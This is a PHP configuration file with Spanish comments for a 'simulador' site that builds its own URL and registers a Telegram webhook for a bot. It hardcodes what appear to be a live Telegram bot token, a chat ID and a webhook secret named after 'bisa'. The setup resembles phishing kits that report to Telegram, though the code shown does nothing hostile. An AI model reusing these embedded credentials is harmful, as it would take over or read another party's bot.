<?php

// ---------------------------------------------------------------
// AUTO-DETECCIÓN de URL del sitio
// ---------------------------------------------------------------
if (php_sapi_name() !== 'cli' && !empty($_SERVER['HTTP_HOST'])) {
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
           || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
           ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    // Detectar la carpeta /simulador/ desde la ruta del archivo
    $script_dir = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME']));
    // Si estamos dentro de simulador, usar esa ruta; si no, agregarla
    if (strpos($script_dir, '/simulador') !== false) {
        $base_path = substr($script_dir, 0, strpos($script_dir, '/simulador') + strlen('/simulador'));
    } else {
        $base_path = rtrim($script_dir, '/') . '/simulador';
    }
    $site_url = $scheme . '://' . $host . $base_path;
} else {
    $site_url = "https://TU-DOMINIO.com/simulador";
}

// Telegram Bot Configuration
$token = "8910530226:AAFkjqMoTQQ90AZIQU5paJLG32HTOo3MYng";
$chat_id = "-5407229864";

// Secret para validar el webhook de Telegram
$webhook_secret = "bisa_wh_7c4a2f8b1e9d3056a8c2f1b4e7d09a3c";

// ---------------------------------------------------------------
// AUTO-REGISTRO DE WEBHOOK (una sola vez)
// ---------------------------------------------------------------
function autoRegisterWebhook() {
    global $token, $site_url, $webhook_secret;
    $flag = __DIR__ . '/.webhook_ok';

    // Si ya se registró y no han pasado más de 24h, no repetir
    if (file_exists($flag) && (time() - filemtime($flag)) < 86400) {
        return;
    }

    $webhook_url = rtrim($site_url, '/') . '/bot.php';
    $api = "https://api.telegram.org/bot$token";

    // Verificar estado actual
    $info_raw = @file_get_contents("$api/getWebhookInfo");
    $info = json_decode($info_raw, true);
    $current_url = $info['result']['url'] ?? '';

    // Si ya apunta a la URL correcta, solo actualizar el flag
    if ($current_url === $webhook_url) {
        @file_put_contents($flag, date('Y-m-d H:i:s') . " OK (ya configurado)\n");
        return;
    }

    // Registrar webhook
    $params = http_build_query([
        'url'                  => $webhook_url,
        'secret_token'         => $webhook_secret,
        'max_connections'      => 10,
        'allowed_updates'      => json_encode(['message', 'callback_query']),
        'drop_pending_updates' => 'true',
    ]);

    $result_raw = @file_get_contents("$api/setWebhook?$params");
    $result = json_decode($result_raw, true);

    $status = ($result['ok'] ?? false) ? 'OK' : 'FAIL';
    $log = date('Y-m-d H:i:s') . " $status | URL: $webhook_url | Response: $result_raw\n";
    @file_put_contents($flag, $log);
    @file_put_contents(__DIR__ . '/tg_log.txt', "[WEBHOOK] $log", FILE_APPEND);
}

// Ejecutar auto-registro solo en requests GET normales (no API)
if (php_sapi_name() !== 'cli'
    && ($_SERVER['REQUEST_METHOD'] ?? '') === 'GET'
    && !isset($_GET['check'])) {
    autoRegisterWebhook();
}

?>
